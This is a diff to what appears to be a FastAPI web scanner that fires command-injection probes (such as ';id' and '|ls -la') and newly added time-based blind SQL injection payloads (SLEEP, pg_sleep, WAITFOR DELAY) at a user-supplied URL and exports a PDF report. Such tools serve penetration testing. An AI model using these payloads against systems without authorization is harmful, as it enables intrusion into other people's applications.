@@ -15,7 +15,7 @@ from reportlab.lib.styles import getSampleStyleSheet
 app = FastAPI()
 templates = Jinja2Templates(directory="templates")
 
-SAFE_PAYLOADS = [
+COMMAND_INJECTION_PAYLOADS = [
     # Basic Delimiters
     "|id",
     ";id",
@@ -46,6 +46,33 @@ SAFE_PAYLOADS = [
     ";ifconfig",
     "|ls -la",
     ";ls -la"
+]
+
+SQLI_BLIND_PAYLOADS = [
+    # Generic Time-based
+    "' OR SLEEP(5)--",
+    "\" OR SLEEP(5)--",
+    "OR SLEEP(5)--",
+    "' AND SLEEP(5)--",
+    "\" AND SLEEP(5)--",
+    "AND SLEEP(5)--",
+    "' OR 1=1 AND SLEEP(5)--",
+    "\" OR 1=1 AND SLEEP(5)--",
+    "OR 1=1 AND SLEEP(5)--",
+
+    # MySQL
+    "' OR BENCHMARK(5000000,MD5('1'))--",
+    "\" OR BENCHMARK(5000000,MD5('1'))--",
+
+    # PostgreSQL
+    "' AND pg_sleep(5)--",
+    "\" AND pg_sleep(5)--",
+    "AND pg_sleep(5)--",
+
+    # SQL Server
+    "'; WAITFOR DELAY '0:0:5'--",
+    "\"; WAITFOR DELAY '0:0:5'--",
+    "WAITFOR DELAY '0:0:5'--"
 ]
 
 
@@ -93,16 +120,17 @@ def discover_parameters(url):
 # ==================================================
 # PAYLOAD TESTER
 # ==================================================
-def test_payload(url, param, payload, headers, method="get"):
+def test_payload(url, param, payload, headers, method="get", scan_type="command_injection"):
     try:
         start = time.time()
+        timeout = 10 if scan_type == "sqli_blind" else 5
 
         if method == "post":
             res = requests.post(url, data={param: payload},
-                                headers=headers, timeout=5)
+                                headers=headers, timeout=timeout)
         else:
             res = requests.get(url, params={param: payload},
-                               headers=headers, timeout=5)
+                               headers=headers, timeout=timeout)
 
         delta = time.time() - start
 
@@ -133,7 +161,8 @@ async def index(request: Request):
 async def scan(
     request: Request,
     url: str = Form(...),
-    param: str = Form("auto"),
+    param: str = Form(...),
+    scan_type: str = Form("command_injection"),
     method: str = Form("get"),
     auth_type: str = Form("none"),
     bearer: str = Form(""),
@@ -151,6 +180,8 @@ async def scan(
     else:
         params = [param]
 
+    payloads = SQLI_BLIND_PAYLOADS if scan_type == "sqli_blind" else COMMAND_INJECTION_PAYLOADS
+
     return templates.TemplateResponse("scanner.html", {
         "request": request,
         "url": url,
@@ -160,7 +191,8 @@ async def scan(
         "bearer": bearer,
         "cookie": cookie,
         "headers": headers,
-        "payloads": SAFE_PAYLOADS
+        "payloads": payloads,
+        "scan_type": scan_type
     })
 
 
@@ -173,6 +205,7 @@ async def test(
     url: str = Form(...),
     param: str = Form(...),
     payload: str = Form(...),
+    scan_type: str = Form("command_injection"),
     method: str = Form("get"),
     auth_type: str = Form("none"),
     bearer: str = Form(""),
@@ -180,7 +213,7 @@ async def test(
     headers: str = Form("")
 ):
     hdrs = build_headers(auth_type, bearer, cookie, headers)
-    result = test_payload(url, param, payload, hdrs, method)
+    result = test_payload(url, param, payload, hdrs, method, scan_type=scan_type)
     return result
 
 
@@ -188,7 +221,7 @@ async def test(
 # PDF EXPORT ENDPOINT
 # ==================================================
 @app.post("/api/export_pdf")
-async def export_pdf(url: str = Form(...), data: str = Form(...)):
+async def export_pdf(url: str = Form(...), data: str = Form(...), scan_type: str = Form("Command Injection")):
     file_id = str(uuid.uuid4())
     pdf_path = f"/tmp/report_{file_id}.pdf"
 
@@ -198,7 +231,7 @@ async def export_pdf(url: str = Form(...), data: str = Form(...)):
     doc = SimpleDocTemplate(pdf_path)
     flow = []
 
-    flow.append(Paragraph("<b>Command Injection Report</b>", styles["Title"]))
+    flow.append(Paragraph(f"<b>{scan_type.replace('_', ' ').title()} Report</b>", styles["Title"]))
     flow.append(Spacer(1, 20))
     flow.append(Paragraph(f"<b>Target URL:</b> {url}", styles["Normal"]))
     flow.append(Spacer(1, 10))
